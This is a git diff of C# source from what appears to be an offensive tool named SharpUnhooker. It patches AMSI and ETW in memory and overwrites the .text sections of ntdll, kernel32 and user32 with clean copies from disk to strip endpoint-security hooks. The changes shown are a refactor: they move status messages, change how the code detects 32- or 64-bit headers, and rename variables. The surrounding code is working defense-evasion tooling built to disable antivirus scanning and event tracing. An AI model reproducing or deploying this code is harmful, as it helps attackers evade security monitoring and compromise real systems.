@@ -436,15 +436,15 @@ public class PatchAMSIAndETW {
 			isit64bit = true;
 		}
 		if (isit64bit) {
-			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10K"));
 			PatchAMSI(x64_amsi_patch);
-			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQo="));
+			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10="));
 			PatchETW(x64_etw_patch);
+			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQ=="));
 		}else {
-			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10K"));
 			PatchAMSI(x86_amsi_patch);
-			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQo="));
+			Console.WriteLine(decode("WysrK10gIUFNU0kgUEFUQ0hFRCEgWysrK10="));
 			PatchETW(x86_etw_patch);
+			Console.WriteLine(decode("WysrK10gIUVUVyBQQVRDSEVEISBbKysrXQ=="));
 		}
 	}
 }
@@ -452,7 +452,6 @@ public class PatchAMSIAndETW {
 public class SharpUnhooker {
 	// Import required Windows APIs
 	public static uint MEM_COMMIT = 0x1000;
-    public static uint MEM_RESERVE = 0x2000;
     public static uint PAGE_EXECUTE_READWRITE = 0x40;
     public static uint PAGE_READWRITE = 0x04;
     [DllImport("kernel32.dll")]
@@ -466,12 +465,6 @@ public class SharpUnhooker {
 
     public static void Unhooker(string DLLname) {
     	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
-    	bool thisis64bit;
-    	if (IntPtr.Size == 4) {
-			thisis64bit = false;
-		}else {
-			thisis64bit = true;
-		}
 		string DLLfile = (@"C:\Windows\System32\" + DLLname);
     	// get original .text section from original DLL
     	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLfile);
@@ -479,10 +472,10 @@ public class SharpUnhooker {
 		Console.WriteLine("Reading Original DLL...");
         // just to be safe,i allocate as big as the DLL :')
         IntPtr codebase;
-        if (thisis64bit) {
-	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);        	
-        }else {
+		if (OriginalDLL.Is32BitHeader) {
 	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        }else {
+	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);        	
         }
         for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
             if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
@@ -491,11 +484,11 @@ public class SharpUnhooker {
                 Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                 byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
                 Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
-                int SectionNumber = i;
+                int TextSectionNumber = i;
                 if (assemblyBytes != null && assemblyBytes.Length > 0) {
 					Console.WriteLine("Yay!Original DLL Readed.");
 					Console.WriteLine("Calculating .text section pointer in loaded DLL...");
-					IntPtr InMemorySectionPointer = (GetModuleHandle(DLLname)) + (int)OriginalDLL.ImageSectionHeaders[SectionNumber].VirtualAddress;
+					IntPtr InMemorySectionPointer = (GetModuleHandle(DLLname)) + (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].VirtualAddress;
 					Console.WriteLine("Calculation done! .text pointer in loaded DLL : {0}", InMemorySectionPointer.ToString("X4"));
 					Console.WriteLine("Updating memory protection setting...");
 					uint oldProtect;
@@ -508,9 +501,9 @@ public class SharpUnhooker {
 						if (patchdll) {
 							Console.WriteLine("Yay!Patch applied!");
 							Console.WriteLine("Rechecking Loaded API After Patching...");
-							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData];
+							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData];
 							IntPtr readPatchedAPI = InMemorySectionPointer;
-							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData);
+							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
 							bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
 							uint newProtect;
 							VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, out newProtect);
@@ -534,22 +527,16 @@ public class SharpUnhooker {
 
     public static void SilentUnhooker(string DLLname) {
     	Console.WriteLine("Unhooking Sequence For {0} Started!", DLLname);
-    	bool thisis64bit;
-    	if (IntPtr.Size == 4) {
-			thisis64bit = false;
-		}else {
-			thisis64bit = true;
-		}
     	// get original .text section from original DLL
     	string DLLfile = (@"C:\Windows\System32\" + DLLname);
     	byte[] DLLBytes = System.IO.File.ReadAllBytes(DLLfile);
         PEReader OriginalDLL = new PEReader(DLLBytes);
         // just to be safe,i allocate as big as the DLL :')
         IntPtr codebase;
-        if (thisis64bit) {
-	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);        	
-        }else {
+		if (OriginalDLL.Is32BitHeader) {
 	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader32.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);
+        }else {
+	        codebase = VirtualAlloc(IntPtr.Zero, OriginalDLL.OptionalHeader64.SizeOfImage, MEM_COMMIT, PAGE_EXECUTE_READWRITE);        	
         }
         for (int i = 0; i < OriginalDLL.FileHeader.NumberOfSections; i++) {
             if (OriginalDLL.ImageSectionHeaders[i].Section == ".text") {
@@ -558,18 +545,18 @@ public class SharpUnhooker {
                 Marshal.Copy(OriginalDLL.RawBytes, (int)OriginalDLL.ImageSectionHeaders[i].PointerToRawData, byteLocationOnMemory, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
                 byte[] assemblyBytes = new byte[OriginalDLL.ImageSectionHeaders[i].SizeOfRawData];
                 Marshal.Copy(byteLocationOnMemory, assemblyBytes, 0, (int)OriginalDLL.ImageSectionHeaders[i].SizeOfRawData);
-                int SectionNumber = i;
+                int TextSectionNumber = i;
                 if (assemblyBytes != null && assemblyBytes.Length > 0) {
-					IntPtr InMemorySectionPointer = (GetModuleHandle(DLLname)) + (int)OriginalDLL.ImageSectionHeaders[SectionNumber].VirtualAddress;
+					IntPtr InMemorySectionPointer = (GetModuleHandle(DLLname)) + (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].VirtualAddress;
 					uint oldProtect;
 	    			bool updateProtection = VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, 0x40, out oldProtect);
 	    			if (updateProtection) {
 	    				IntPtr WPMOutput;
 						bool patchdll = WriteProcessMemory(Process.GetCurrentProcess().Handle, InMemorySectionPointer, assemblyBytes, assemblyBytes.Length, out WPMOutput);
 						if (patchdll) {
-							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData];
+							byte[] assemblyBytesAfterPatched = new byte[OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData];
 							IntPtr readPatchedAPI = InMemorySectionPointer;
-							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[SectionNumber].SizeOfRawData);
+							Marshal.Copy(readPatchedAPI, assemblyBytesAfterPatched, 0, (int)OriginalDLL.ImageSectionHeaders[TextSectionNumber].SizeOfRawData);
 							bool checkAssemblyBytesAfterPatched = assemblyBytesAfterPatched.SequenceEqual(assemblyBytes);
 							uint newProtect;
 							VirtualProtect(InMemorySectionPointer, (UIntPtr)assemblyBytes.Length, oldProtect, out newProtect);
@@ -598,8 +585,7 @@ public class SharpUnhooker {
     	Console.WriteLine("[--------------------------------------]");
     	Console.WriteLine("[++++++++++!SEQUENCE=STARTED!++++++++++]");
     	Console.WriteLine("--------PHASE 1 == API UNHOOKING--------");
-    	// if you want to add more on here,dont forget the ".dll" extension!
-    	// and the DLL needs to be on C:\Windows\System32\ directory!
+    	// just to be safe,pls dont add more on here
     	SilentUnhooker("ntdll.dll");
     	SilentUnhooker("kernel32.dll");
     	SilentUnhooker("user32.dll");
